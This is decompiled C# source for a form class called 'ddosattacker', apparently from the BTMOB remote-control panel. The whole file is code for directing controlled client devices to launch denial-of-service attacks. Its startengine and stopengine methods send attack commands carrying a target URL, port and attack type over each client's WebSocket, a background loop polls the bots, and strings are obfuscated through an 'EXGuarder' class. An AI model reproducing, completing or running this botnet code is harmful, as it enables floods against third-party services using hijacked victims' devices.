using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class ddosattacker : basestyle
{
	[ComVisible(true)]
	public class enghost
	{
		private readonly ddosattacker main;

		private bool isDragging;

		public enghost(ddosattacker f)
		{
			isDragging = false;
			main = f;
		}

		[DispId(1)]
		public void startengine(string clientId, string Turl, string Tport, string ATktype)
		{
			BTClient bTClient = main.getclient(clientId);
			if (bTClient != null)
			{
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add("msg", BTConst.ddosattack);
				dictionary.Add("turl", Turl);
				dictionary.Add("tport", Tport);
				dictionary.Add("ttype", ATktype);
				dictionary.Add("tstate", "1");
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
			}
			else
			{
				Debuger.Log_e("Start DDEngine", "Can't find client");
			}
		}

		[DispId(2)]
		public void stopengine(string clientId)
		{
			BTClient bTClient = main.getclient(clientId);
			if (bTClient != null)
			{
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add("msg", BTConst.ddosattack);
				dictionary.Add("tstate", "0");
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
			}
			else
			{
				Debuger.Log_e("Start DDEngine", "Can't find client");
			}
		}

		[DispId(3)]
		public void startdrag()
		{
			if (main == null || main.IsDisposed)
			{
				return;
			}
			if (main.InvokeRequired)
			{
				main.BeginInvoke((MethodInvoker)([SpecialName] () =>
				{
					DoDrag();
				}));
			}
			else
			{
				DoDrag();
			}
		}

		private void DoDrag()
		{
			if (isDragging)
			{
				return;
			}
			isDragging = true;
			try
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(main.Handle, 161, 2, 0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			finally
			{
				isDragging = false;
			}
		}

		[DispId(4)]
		public void Alert(string msg)
		{
			main.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				BTAlerter.infos(msg);
			}));
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Refworker")]
	private BackgroundWorker _Refworker;

	public List<BTClient> listclients;

	public List<string> activedos;

	private bool ialive;

	[field: AccessedThroughProperty("ddosview")]
	internal virtual WebView2 ddosview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker Refworker
	{
		[CompilerGenerated]
		get
		{
			return _Refworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = Refworker_DoWork;
			BackgroundWorker backgroundWorker = _Refworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_Refworker = value;
			backgroundWorker = _Refworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.ddosattacker));
		this.ddosview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Refworker = new System.ComponentModel.BackgroundWorker();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ddosview).BeginInit();
		base.SuspendLayout();
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(1444, 5);
		this.minibtn.Location = new System.Drawing.Point(1486, 5);
		this.closbtn.Location = new System.Drawing.Point(1528, 5);
		this.myico.Visible = false;
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(1560, 16);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(1570, 24);
		this.tobpanelsti.Visible = false;
		this.ddosview.AllowExternalDrop = true;
		this.ddosview.CreationProperties = null;
		this.ddosview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ddosview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ddosview.Location = new System.Drawing.Point(2, 62);
		this.ddosview.Name = EXGuarder._23202B74;
		this.ddosview.Size = new System.Drawing.Size(1570, 781);
		this.ddosview.TabIndex = 40;
		this.ddosview.ZoomFactor = 1.0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1574, 845);
		base.Controls.Add(this.ddosview);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._6C24362E);
		base.Name = EXGuarder._2F284379;
		this.Text = EXGuarder._2F284379;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.ddosview, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.ddosview).EndInit();
		base.ResumeLayout(false);
	}

	public BTClient getclient(string tid)
	{
		return listclients.FirstOrDefault([SpecialName] (BTClient c) => Operators.CompareString(c.mobid, tid, TextCompare: false) == 0);
	}

	public ddosattacker()
	{
		base.Load += ddosattacker_Load;
		base.FormClosing += ddosattacker_FormClosing;
		listclients = new List<BTClient>();
		activedos = new List<string>();
		ialive = true;
		InitializeComponent();
	}

	private async void ddosattacker_Load(object sender, EventArgs e)
	{
		await ddosview.EnsureCoreWebView2Async();
		string newValue = codes.locallanguage();
		string path = "ddsview.html";
		File.WriteAllBytes(Path.Combine(Application.StartupPath, path), Resources.ddosview);
		File.WriteAllText(contents: File.ReadAllText(Path.Combine(Application.StartupPath, path)).Replace("[LNG]", newValue), path: Path.Combine(Application.StartupPath, path));
		enghost rawObject = new enghost(this);
		ddosview.CoreWebView2.NavigationCompleted += updateview_NavigationCompleted;
		ddosview.CoreWebView2.Navigate(new Uri(Path.Combine(Application.StartupPath, path)).AbsoluteUri);
		ddosview.CoreWebView2.AddHostObjectToScript("enghost", rawObject);
		ddosview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		ddosview.CoreWebView2.Settings.AreDevToolsEnabled = false;
	}

	private async void updateview_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
		if (e.IsSuccess)
		{
			loadclients();
			if (!Refworker.IsBusy)
			{
				Refworker.RunWorkerAsync();
			}
		}
	}

	private void loadclients()
	{
		if (listclients.Count <= 0)
		{
			return;
		}
		foreach (BTClient listclient in listclients)
		{
			try
			{
				string javaScript = EXGuarder._4E69562B + string.Format(EXGuarder._04006E38, codes.BitmapToBase64(listclient.wallpaper)) + string.Format(EXGuarder._04006E38, listclient.name) + string.Format(EXGuarder._04006E38, listclient.address) + EXGuarder._7636370D + string.Format(EXGuarder._04006E38, listclient.Serverins.Sname) + string.Format(EXGuarder._04006E38, listclient.Serverins.Scolor) + string.Format(EXGuarder._04006E38, listclient.mobid) + EXGuarder._3A677659;
				ddosview.CoreWebView2.ExecuteScriptAsync(javaScript);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox(EXGuarder._4F1B0C68 + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Refworker_DoWork(object sender, DoWorkEventArgs e)
	{
		while (ialive)
		{
			try
			{
				if (base.IsDisposed)
				{
					break;
				}
				if (listclients.Count > 0)
				{
					foreach (BTClient listclient in listclients)
					{
						try
						{
							if (base.IsDisposed | !ialive)
							{
								return;
							}
							Dictionary<string, object> dictionary = new Dictionary<string, object>();
							dictionary.Add(EXGuarder._730E4B39, BTConst.ddosattack);
							dictionary.Add(EXGuarder._0429311A, EXGuarder._134D794E);
							Dictionary<string, object> chatData = dictionary;
							BTEngine.commands(chatData, listclient.mobid, listclient.Serverins.WSClient);
							Thread.Sleep(1);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							Interaction.MsgBox(EXGuarder._01094922 + ex2.Message);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(5000);
		}
	}

	private void ddosattacker_FormClosing(object sender, FormClosingEventArgs e)
	{
		ialive = false;
		Refworker.Dispose();
	}

	public void updateclient(string mobid, string isActive, string targeturl, string Targettype)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				updateclient(mobid, isActive, targeturl, Targettype);
			}));
		}
		else
		{
			string text = string.Format(EXGuarder._0A060872, mobid) + string.Format(EXGuarder._2C5F4079, isActive) + string.Format(EXGuarder._2C5F4079, targeturl) + string.Format(EXGuarder._13052C24, Targettype);
			ddosview.CoreWebView2.ExecuteScriptAsync(text + string.Format(EXGuarder._763D4D05, listclients.Count, activedos.Count));
		}
	}
}
